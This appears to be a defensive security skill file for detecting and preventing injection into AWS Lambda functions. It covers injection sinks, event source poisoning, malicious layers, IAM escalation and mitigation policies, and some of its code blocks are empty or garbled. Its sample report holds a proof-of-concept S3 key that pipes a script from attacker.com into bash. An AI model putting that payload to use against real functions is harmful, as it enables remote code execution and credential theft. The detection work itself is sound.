@@ -1,0 +1,342 @@
+\title{Detecting Serverless Function Injection}
+
+\taxon{skill}
+
+\tag{serverless-security}
+
+\tag{Lambda-injection}
+
+\tag{event-source-poisoning}
+
+\tag{OWASP-serverless}
+
+\tag{IAM-escalation}
+
+\tag{CloudTrail}
+
+\meta{version}{1.0.0}
+
+\meta{description}{Detects and prevents code injection attacks targeting serverless functions (AWS Lambda, Azure Functions, Google Cloud Functions) through event source poisoning, malicious layer injection, runtime command execution, and IAM privilege escalation via function modification. The analyst combines static analysis of function code, CloudTrail event correlation, runtime behavior monitoring, and IAM policy auditing to identify injection vectors across the expanded serverless attack surface including API Gateway, S3, SQS, DynamoDB Streams, and CloudWatch event triggers. Activates for requests involving Lambda security assessment, serverless injection detection, function event poisoning analysis, or serverless privilege escalation investigation.}
+
+\subtree{
+\title{Detecting Serverless Function Injection}
+\subtree{
+\title{When to Use}
+\ul{
+\li{Auditing Lambda/Cloud Functions for code injection vulnerabilities where unsanitized event data flows into dangerous runtime functions (\code{\startverb eval\stopverb}, \code{\startverb exec\stopverb}, \code{\startverb child_process.exec\stopverb}, \code{\startverb os.system\stopverb})}
+\li{Investigating incidents where an attacker modified function code or layers to establish persistence or exfiltrate data from the serverless environment}
+\li{Detecting privilege escalation paths where an adversary with \code{\startverb lambda:UpdateFunctionCode\stopverb} and \code{\startverb iam:PassRole\stopverb} can assume higher-privilege execution roles}
+\li{Analyzing event source poisoning attacks where malicious payloads are injected through S3 object uploads, SQS messages, DynamoDB stream records, or API Gateway requests that trigger function execution}
+\li{Building detection rules for SOC teams monitoring serverless workloads for unauthorized function modifications, layer additions, and suspicious invocation patterns}
+}
+
+\p{\strong{Do not use} for load testing or denial-of-service simulation against serverless functions, for testing against production functions processing live customer data without explicit authorization, or for modifying IAM policies in shared accounts without change management approval.}
+}
+
+\subtree{
+\title{Prerequisites}
+\ul{
+\li{AWS account access with read permissions for Lambda, CloudTrail, IAM, CloudWatch Logs, and EventBridge}
+\li{AWS CLI v2 configured with appropriate credentials and region}
+\li{CloudTrail enabled with Data Events for Lambda (captures \code{\startverb Invoke\stopverb} events) and Management Events (captures \code{\startverb UpdateFunctionCode\stopverb}, \code{\startverb UpdateFunctionConfiguration\stopverb}, \code{\startverb CreateFunction\stopverb})}
+\li{Python 3.9+ with \code{\startverb boto3\stopverb}, \code{\startverb bandit\stopverb} (Python SAST), and \code{\startverb semgrep\stopverb} for static analysis}
+\li{Access to function source code or deployment packages for static analysis}
+\li{CloudWatch Logs Insights access for querying Lambda execution logs}
+}
+}
+
+\subtree{
+\title{Workflow}
+\subtree{
+\title{Step 1: Enumerate the Serverless Attack Surface}
+\p{Map all Lambda functions and their event source triggers to understand injection entry points:}
+
+\ul{
+\li{\strong{List all Lambda functions and their configurations}:}
+\li{\strong{Map event source mappings}: Each event source mapping is a potential injection entry point where untrusted data enters the function:}
+\li{\strong{Identify API Gateway triggers}: API Gateway routes pass HTTP request data (headers, query strings, body, path parameters) directly into the Lambda event object:}
+\li{\strong{Identify S3 event triggers}: S3 bucket notifications can trigger Lambda with attacker-controlled object keys and metadata:}
+\li{\strong{Catalog function environment variables}: Secrets in environment variables are exposed if an attacker achieves code execution inside the function:}
+\li{\strong{Identify overprivileged execution roles}: Functions with \code{\startverb *\stopverb} resource permissions or administrative policies are high-value escalation targets:}
+}
+}
+
+\subtree{
+\title{Step 2: Static Analysis for Injection Sinks}
+\p{Scan function code for dangerous patterns that allow injected event data to execute as code or commands:}
+
+\ul{
+\li{\strong{Download function deployment packages}:}
+\li{\strong{Python injection sinks} (Lambda Python runtimes): Search for functions that execute strings as code:}
+\li{\strong{Node.js injection sinks} (Lambda Node.js runtimes):}
+\li{\strong{Run Semgrep with serverless rules}: Use purpose-built rules that detect event data flowing into injection sinks:}
+\li{\strong{Run Bandit for Python functions}:}
+}
+
+\ul{
+\li{\strong{Custom pattern detection}: Search for indirect injection patterns where event data is concatenated into strings that are later executed:}
+}
+
+\subtree{
+\title{Indirect injection: event data flows into template rendering}
+\p{template = event['template'] rendered = jinja2.Template(template).render()  # SSTI}
+
+\pre{\startverb
+
+\stopverb}
+}
+}
+
+\subtree{
+\title{Step 3: Detect Event Source Poisoning}
+\p{Analyze event sources for injection payloads that exploit how Lambda processes triggers:}
+
+\ul{
+\li{\strong{S3 event key injection}: When a Lambda function processes S3 events, the object key from the event record can contain injection payloads. An attacker uploads an object with a malicious key name:}
+}
+
+\ul{
+\li{\strong{SQS message body injection}: Lambda processes SQS messages where the body contains attacker-controlled data:}
+}
+
+\ul{
+\li{\strong{API Gateway header/parameter injection}: HTTP request data passes through API Gateway into the Lambda event:}
+}
+
+\ul{
+\li{\strong{DynamoDB Stream record injection}: Modified DynamoDB items trigger Lambda with the new record values. If an attacker can write to the table, they control the event data:}
+}
+
+\ul{
+\li{\strong{Detection via CloudWatch Logs Insights}: Query for evidence of injection attempts in function execution logs:}
+}
+}
+
+\subtree{
+\title{Step 4: Detect Malicious Lambda Layer Injection}
+\p{Identify unauthorized Lambda layers that intercept function execution or exfiltrate data:}
+
+\ul{
+\li{\strong{Audit current layer attachments}: List all functions and their layer versions to identify unexpected additions:}
+\li{\strong{Detect layer modification events in CloudTrail}: Query for \code{\startverb UpdateFunctionConfiguration\stopverb} events that add or change layers:}
+}
+
+\ul{
+\li{\strong{Analyze layer contents}: Download and inspect layer packages for malicious code:}
+}
+
+\ul{
+\li{\strong{Layer hijacking indicators}: A malicious layer can override the function's runtime behavior by placing files in the runtime's search path:}
+\li{Python: Layer code in \code{\startverb /opt/python/\stopverb} is imported before the function's own modules}
+\li{Node.js: Layer code in \code{\startverb /opt/nodejs/node_modules/\stopverb} overrides function dependencies}
+\li{A layer providing a modified \code{\startverb boto3\stopverb} package can intercept all AWS API calls, log credentials, and forward requests to an attacker-controlled endpoint}
+}
+
+\ul{
+\li{\strong{CloudTrail detection query for layer changes}:}
+}
+}
+
+\subtree{
+\title{Step 5: Detect IAM Privilege Escalation via Lambda}
+\p{Identify escalation paths where attackers modify functions to assume higher-privilege roles:}
+
+\ul{
+\li{\strong{The Lambda privilege escalation pattern}: An attacker with \code{\startverb lambda:UpdateFunctionCode\stopverb} and \code{\startverb iam:PassRole\stopverb} permissions can:}
+\li{Identify a Lambda function with a high-privilege execution role (e.g., AdministratorAccess)}
+\li{Modify the function's code to call \code{\startverb sts:GetCallerIdentity\stopverb} or perform privileged actions}
+\li{Invoke the function, which executes with the high-privilege role}
+\li{Exfiltrate the role's temporary credentials from the function's environment variables (\code{\startverb AWS_ACCESS_KEY_ID\stopverb}, \code{\startverb AWS_SECRET_ACCESS_KEY\stopverb}, \code{\startverb AWS_SESSION_TOKEN\stopverb})}
+}
+
+\ul{
+\li{\strong{Detect UpdateFunctionCode events}: Monitor CloudTrail for function code modifications:}
+}
+
+\ul{
+\li{\strong{Detect PassRole to Lambda}: \code{\startverb iam:PassRole\stopverb} is required to attach a different execution role to a function. Monitor for this:}
+}
+
+\ul{
+\li{\strong{Detect credential exfiltration from Lambda}: A compromised function may call STS or create new IAM entities:}
+}
+
+\ul{
+\li{\strong{EventBridge rule for real-time alerting}: Create an EventBridge rule to trigger an SNS alert whenever function code is modified:}
+}
+}
+
+\subtree{
+\title{Step 6: Implement Runtime Injection Prevention}
+\p{Deploy runtime protection controls to prevent injection at execution time:}
+
+\ul{
+\li{\strong{Input validation at handler entry}: Validate and sanitize all event data before processing:}
+}
+
+\p{SAFE_PATTERNS = { 'userId': re.compile(r'^[a-zA-Z0-9\-]{1,64}$'), 'email': re.compile(r'^[a-zA-Z0-9._\%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'), 'action': re.compile(r'^(get|list|create|update|delete)$'), }}
+
+\p{def validate_event(schema): """Decorator that validates Lambda event against a whitelist schema.""" def decorator(func): @wraps(func) def wrapper(event, context): for field, pattern in schema.items(): value = event.get(field, '') if isinstance(value, str) and not pattern.match(value): return { 'statusCode': 400, 'body': json.dumps({'error': f'Invalid {field}'}) } return func(event, context) return wrapper return decorator}
+
+\p{@validate_event(SAFE_PATTERNS) def handler(event, context):}
+
+\subtree{
+\title{Event data is validated before reaching this point}
+\p{user_id = event['userId']}
+}
+
+\subtree{
+\title{Safe to use in queries with parameterized statements}
+\p{return {'statusCode': 200, 'body': json.dumps({'user': user_id})}}
+
+\pre{\startverb
+
+- **Lambda function URL authorization**: Ensure functions exposed via URLs require IAM auth:
+\stopverb}
+
+\p{aws lambda get-function-url-config --function-name <name> \ --query 'AuthType' --output text}
+}
+
+\subtree{
+\title{Must return "AWS_IAM", not "NONE"}
+\pre{\startverb
+
+- **Least privilege execution roles**: Restrict the function's IAM role to the minimum required permissions:
+\stopverb}
+
+\p{{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Action": [ "dynamodb:GetItem", "dynamodb:PutItem" ], "Resource": "arn:aws:dynamodb:us-east-1:111122223333:table/UserTable" }, { "Effect": "Allow", "Action": "logs:*", "Resource": "arn:aws:logs:us-east-1:111122223333:log-group:/aws/lambda/my-function:*" } ] }}
+
+\pre{\startverb
+
+- **SCP to prevent dangerous Lambda modifications**: Apply a Service Control Policy at the organization level to restrict who can modify Lambda functions and pass roles:
+\stopverb}
+
+\p{{ "Version": "2012-10-17", "Statement": [ { "Sid": "DenyLambdaCodeUpdateExceptCICD", "Effect": "Deny", "Action": [ "lambda:UpdateFunctionCode", "lambda:UpdateFunctionConfiguration" ], "Resource": "*", "Condition": { "StringNotLike": { "aws:PrincipalArn": "arn:aws:iam::*:role/CICD-DeploymentRole" } } } ] }}
+
+\pre{\startverb
+
+- **AWS Lambda Powertools for structured logging**: Emit structured security events that can be ingested by SIEM:
+\stopverb}
+
+\p{from aws_lambda_powertools import Logger, Tracer from aws_lambda_powertools.utilities.validation import validate}
+
+\p{logger = Logger(service="payment-processor") tracer = Tracer()}
+
+\p{@logger.inject_lambda_context @tracer.capture_lambda_handler def handler(event, context): logger.info("Processing event", extra={ "source_ip": event.get('requestContext', {}).get('identity', {}).get('sourceIp'), "user_agent": event.get('headers', {}).get('User-Agent'), "http_method": event.get('httpMethod'), })}
+
+\pre{\startverb
+
+\stopverb}
+}
+}
+}
+
+\subtree{
+\title{Key Concepts}
+\pre{\startverb
+| Term | Definition |
+|------|------------|
+| **Event Source Poisoning** | An attack where malicious data is injected into a serverless event source (S3, SQS, DynamoDB Stream, API Gateway) to trigger code execution or injection when the function processes the event |
+| **Function Injection** | Exploitation of unsanitized event data that flows into dangerous runtime functions (eval, exec, os.system, child_process.exec) within a serverless function handler |
+| **Lambda Layer Hijacking** | An attack where a malicious Lambda layer is attached to a function to intercept execution, override dependencies, or exfiltrate data by placing code in the runtime's module search path |
+| **IAM Privilege Escalation via Lambda** | A technique where an attacker with UpdateFunctionCode and PassRole permissions modifies a function to execute with a higher-privilege IAM role, extracting temporary credentials |
+| **OWASP Serverless Top 10** | A security framework identifying the ten most critical risks in serverless architectures, including injection (SAS-1), broken authentication (SAS-2), and over-privileged functions (SAS-6) |
+| **Cold Start Injection** | An attack that targets the function initialization phase where environment variables, layer code, and extensions execute before the handler, potentially in an unmonitored context |
+| **Execution Role** | The IAM role assumed by a Lambda function during execution, providing temporary credentials that define the function's AWS API access permissions |
+\stopverb}
+}
+
+\subtree{
+\title{Tools & Systems}
+\ul{
+\li{\strong{Semgrep}: Static analysis tool with serverless-specific rule packs that detect event data flowing into injection sinks across Python, Node.js, Java, and Go Lambda runtimes}
+\li{\strong{Bandit}: Python-specific SAST tool that identifies security issues including use of eval, exec, subprocess with shell=True, and pickle deserialization}
+\li{\strong{AWS CloudTrail}: Logs Lambda management events (UpdateFunctionCode, CreateFunction) and data events (Invoke) for detecting unauthorized modifications and anomalous invocation patterns}
+\li{\strong{CloudWatch Logs Insights}: Query engine for searching Lambda execution logs for injection attempt indicators, runtime errors, and suspicious command patterns}
+\li{\strong{AWS Config}: Evaluates Lambda function configurations against compliance rules including layer inventory, execution role permissions, and function URL authorization types}
+\li{\strong{Prowler}: Open-source AWS security assessment tool with Lambda-specific checks for public access, overprivileged roles, and missing encryption}
+}
+}
+
+\subtree{
+\title{Common Scenarios}
+\subtree{
+\title{Scenario: Detecting and Responding to a Lambda-Based Privilege Escalation Attack}
+\p{\strong{Context}: A SOC analyst receives a GuardDuty alert for \code{\startverb UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS\stopverb} on an IAM role used by multiple Lambda functions. Investigation reveals that an attacker compromised a developer's AWS credentials with \code{\startverb lambda:UpdateFunctionCode\stopverb} permissions and modified a payment processing function to exfiltrate the execution role's temporary credentials.}
+
+\p{\strong{Approach}:}
+
+\ol{
+\li{Query CloudTrail for \code{\startverb UpdateFunctionCode\stopverb} events in the past 7 days to identify when the function was modified and by which principal:}
+\li{Discover that the function was modified from an IP address in an unexpected geographic location at 02:47 UTC, outside of normal deployment windows}
+\li{Download the modified function code and find an injected snippet that POSTs \code{\startverb os.environ['AWS_ACCESS_KEY_ID']\stopverb}, \code{\startverb AWS_SECRET_ACCESS_KEY\stopverb}, and \code{\startverb AWS_SESSION_TOKEN\stopverb} to an external endpoint on each invocation}
+\li{Check if the attacker also added a malicious layer by querying for \code{\startverb UpdateFunctionConfiguration\stopverb} events with layer changes}
+\li{Verify the function's execution role permissions: the payment-processor role has \code{\startverb dynamodb:*\stopverb}, \code{\startverb s3:GetObject\stopverb}, \code{\startverb s3:PutObject\stopverb}, and \code{\startverb sqs:SendMessage\stopverb} across all resources, exceeding least privilege}
+\li{Search CloudTrail for API calls made by the exfiltrated credentials from outside AWS, finding \code{\startverb sts:GetCallerIdentity\stopverb}, \code{\startverb s3:ListBuckets\stopverb}, \code{\startverb dynamodb:Scan\stopverb} on the customer table, and \code{\startverb iam:CreateUser\stopverb} attempts}
+\li{Respond by reverting the function code from the last known-good deployment package in the CI/CD artifact store, rotating the execution role's session tokens, and adding an SCP that restricts \code{\startverb lambda:UpdateFunctionCode\stopverb} to the CI/CD role only}
+}
+
+\p{\strong{Pitfalls}:}
+
+\ul{
+\li{Only checking the function code and missing malicious layers that persist even after the function code is reverted}
+\li{Not searching for lateral movement from the exfiltrated credentials to other AWS services, missing data exfiltration from DynamoDB or S3}
+\li{Failing to check if the attacker created new IAM users, access keys, or roles during the window the credentials were valid}
+\li{Restoring the function without first preserving the malicious code as forensic evidence}
+\li{Not implementing preventive controls (SCP, EventBridge alerting) after remediation, leaving the same attack path open}
+}
+}
+}
+
+\subtree{
+\title{Output Format}
+\pre{\startverb
+## Serverless Function Injection Assessment
+
+**Account**: 111122223333
+**Region**: us-east-1
+**Functions Analyzed**: 47
+**Event Source Mappings**: 23
+**Assessment Date**: 2026-03-19
+
+### Critical Findings
+
+#### FINDING-001: OS Command Injection in S3 Event Handler
+**Function**: image-resize-processor
+**Runtime**: python3.12
+**Severity**: Critical (CVSS 9.8)
+**Sink**: os.system() at handler.py:34
+**Source**: event['Records'][0]['s3']['object']['key']
+**Attack Vector**: Upload S3 object with key containing shell metacharacters
+**Proof of Concept**:
+  Object key: `; curl http://attacker.com/shell.sh | bash`
+  Results in: os.system("convert /tmp/; curl http://attacker.com/shell.sh | bash")
+**Remediation**: Replace os.system() with subprocess.run() with shell=False
+  and validate the S3 key against an allowlist pattern.
+
+#### FINDING-002: IAM Privilege Escalation Path
+**Function**: data-export-worker
+**Execution Role**: arn:aws:iam::111122223333:role/DataExportRole
+**Role Permissions**: s3:*, dynamodb:*, iam:PassRole, lambda:*
+**Risk**: Any user with lambda:UpdateFunctionCode can modify this function
+  to execute arbitrary AWS API calls with AdministratorAccess-equivalent permissions.
+**Remediation**: Apply least privilege to the execution role, restrict
+  lambda:UpdateFunctionCode via SCP to CI/CD pipeline role only.
+
+#### FINDING-003: Unauthorized Layer Attached
+**Function**: auth-token-validator
+**Layer**: arn:aws:lambda:us-east-1:999888777666:layer:utility-lib:3
+**Layer Account**: External account (999888777666)
+**Risk**: Layer from untrusted external account can intercept all function
+  invocations, modify responses, or exfiltrate environment variables.
+**Remediation**: Remove the external layer, vendor the dependency into the
+  function's deployment package, add AWS Config rule to block external layers.
+
+### Detection Rules Deployed
+- EventBridge rule: Alert on UpdateFunctionCode from non-CI/CD principals
+- CloudWatch alarm: Function error rate spike > 3x baseline in 5 minutes
+- Config rule: Lambda functions must not have layers from external accounts
+- Config rule: Lambda execution roles must not have wildcard resource permissions
+\stopverb}
+}
+}
